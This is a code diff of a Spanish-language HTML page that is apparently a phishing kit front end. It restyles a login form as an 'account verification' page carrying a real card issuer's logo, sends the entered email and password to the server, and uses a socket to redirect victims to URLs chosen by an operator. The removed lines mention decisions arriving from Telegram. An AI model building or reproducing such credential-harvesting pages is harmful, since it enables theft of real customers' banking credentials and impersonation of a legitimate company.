@@ -1,62 +1,128 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8">
-  <title>Formulario de acceso</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificación de cuenta</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    body {
+      background-color: #f3f6fb;
+      font-family: Arial, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      border-radius: 15px;
+      padding: 40px 30px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .logo {
+      margin-bottom: 30px;
+    }
+    .logo img {
+      height: 50px;
+    }
+    h2 {
+      font-size: 1.5em;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #777;
+      font-size: 0.95em;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 1em;
+    }
+    button {
+      background-color: #00b075;
+      color: white;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 1em;
+      width: 100%;
+    }
+    button:hover {
+      background-color: #019765;
+    }
+  </style>
 </head>
 <body>
-  <h1>Login</h1>
-  <form id="loginForm">
-    <label>Usuario:</label><br>
-    <input type="text" name="usuario" required><br>
-    <label>Contraseña:</label><br>
-    <input type="password" name="clave" required><br><br>
-    <button type="submit">Enviar</button>
-  </form>
+  <div class="container">
+    <div class="logo">
+      <!-- Puedes cambiar este ícono si quieres -->
+      <img src="https://stori.card/img/logo.svg" alt="logo" />
+    </div>
+    <h2>Verificación de cuenta</h2>
+    <p>Ingrese su correo y contraseña para continuar</p>
+   <form id="login-form">
+  <input type="text" id="usuario" placeholder="Correo electrónico" required />
+  <input type="password" id="clave" placeholder="Contraseña" required />
+  <button type="submit">Continuar</button>
+</form>
 
-  <div id="respuesta" style="margin-top:20px; display:none;">
-    <p>Esperando respuesta desde Telegram...</p>
   </div>
 
-  <script>
-    const form = document.getElementById('loginForm');
-    const respuesta = document.getElementById('respuesta');
+<!-- ... todo tu HTML ... -->
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const datos = new FormData(form);
-      const json = {
-        usuario: datos.get('usuario'),
-        clave: datos.get('clave')
-      };
+<script>
+  window.addEventListener('DOMContentLoaded', () => {
+    const form = document.getElementById('login-form');
+    if (form) {
+      form.addEventListener('submit', function (e) {
+        e.preventDefault(); // detener el envío por defecto
 
-      await fetch('/enviar', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(json)
+        const usuario = document.getElementById('usuario').value;
+        const clave = document.getElementById('clave').value;
+
+        // Aquí podrías enviar los datos a un servidor (esto es un ejemplo)
+        fetch('/enviar', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ usuario, clave })
+        })
+        .then(response => {
+          if (response.ok) {
+            // redirige si el servidor responde OK
+            window.location.href = 'opciones.html';
+          } else {
+            alert('Error al enviar datos');
+          }
+        })
+        .catch(error => {
+          console.error('Error de red', error);
+        });
       });
-
-      form.style.display = 'none';
-      respuesta.style.display = 'block';
-    });
-  </script>
- <script src="/socket.io/socket.io.js"></script>
+    }
+  });
+</script>
+  <script src="/socket.io/socket.io.js"></script>
 <script>
   const socket = io();
 
-  // Escucha las decisiones que llegan desde Telegram
-  socket.on('decision', (data) => {
-    console.log('✅ Acción recibida:', data);
-
-    // Redirige según la URL recibida
-    if (data.url) {
-      window.location.href = data.url;
-    }
+  socket.on('redirect', (url) => {
+    console.log("🔁 Redirigiendo a:", url);
+    window.location.href = url;
   });
 </script>
 
 
+
+<script src="main.js"></script>
 </body>
 </html>
